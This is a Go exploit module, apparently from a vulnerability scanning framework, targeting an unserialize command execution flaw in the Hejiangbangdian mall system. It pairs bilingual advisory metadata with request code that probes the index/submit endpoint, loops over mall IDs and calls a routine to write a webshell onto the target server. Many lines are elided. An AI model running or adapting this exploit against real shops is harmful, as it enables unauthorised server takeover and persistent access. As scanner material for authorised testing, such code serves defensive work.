...
func init() {
	expJson := `{
    "Name": "Hejiangbangdian mall system index/submit method exist Command Execution Vulnerability",
    "Description": "<p>Hejiangbangdian mall system is a PHP and MySQL based mall system of Zhejiang Hejiang Information Technology Co., Ltd.</p><p>There is a command execution vulnerability in the index/submit method of the Hejiangbangdian mall system. The vulnerability stems from the failure to filter the parameters passed into unserialize</p>",
    ...
    "Level": "3",
    "Impact": "<p>There is a command execution vulnerability in the index/submit method of the Hejiangbangdian mall system. An attacker can write a Trojan file to the server and directly obtain permissions.</p>",
    ...
    "References": [
        "https://www.zjhejiang.com/site/index"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
    ...
    "Translation": {
        "CN": {
            "Name": "禾匠榜店商城系统 index/submit 方法存在命令执行漏洞",
            "Product": "榜店商城系统",
            "Description": "<p><span style=\"color: rgb(62, 62, 62);\">禾匠榜店商城系统是<span style=\"color: rgb(62, 62, 62);\">浙江禾匠信息科技有限公司</span>的一套基于PHP和MySQL的商城系统。</span><br></p><p><span style=\"color: rgb(62, 62, 62);\">禾匠榜店商城系统的index/submit方法存在命令执行漏洞</span>，该漏洞源于对传进unserialize的参数未进行过滤</p>",
            ...
            "Impact": "<p><span style=\"font-size: medium;\"><span style=\"color: rgb(62, 62, 62);\"></span><span style=\"color: rgb(62, 62, 62);\">禾匠榜店商城系统的</span><span style=\"color: rgb(62, 62, 62);\">index/submit</span><span style=\"color: rgb(62, 62, 62);\">方法存在命令执行漏洞</span>，攻击者可以向服务器写入木马文件，直接获取权限</span></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
        ...
        "EN": {
            ...
            "Description": "<p>Hejiangbangdian mall system is a PHP and MySQL based mall system of Zhejiang Hejiang Information Technology Co., Ltd.</p><p>There is a command execution vulnerability in the index/submit method of the Hejiangbangdian mall system. The vulnerability stems from the failure to filter the parameters passed into unserialize</p>",
            "Recommendation": "<p>1. The manufacturer has fixed this vulnerability, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor sensitive functions</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a command execution vulnerability in the index/submit method of the Hejiangbangdian mall system. An attacker can write a Trojan file to the server and directly obtain permissions.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
	...
	ExpManager.AddExploit(NewExploit(
		...
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			...
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil{
				if strings.Contains(resp.RawBody,"phpinfo()"){
					...
					for n := 2; n < 200; n++{
						uri1 := fmt.Sprintf("/web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=%d",n)
		...
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			...
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil{
				if strings.Contains(resp.RawBody,"phpinfo()"){
					write_shell123(1,expResult,filename)
				}else if strings.Contains(resp.RawBody,"id = "){
					for n := 2; n < 200; n++{
						uri1 := fmt.Sprintf("/web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=%d",n)
						cfg1 := httpclient.NewPostRequestConfig(uri1)
						...
						if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && strings.Contains(resp1.RawBody,"phpinfo()"){
							write_shell123(n,expResult,filename)
							break
						}else if strings.Contains(resp1.RawBody,"never be unserialized") || strings.Contains(resp1.RawBody,"Version: 4.5") || strings.Contains(resp1.RawBody,"Version: 4.4") || strings.Contains(resp1.RawBody,"Version: 5.1") || strings.Contains(resp1.RawBody,"Version: 5.2") || strings.Contains(resp1.RawBody,"Version: 5.3"){
							break
						}
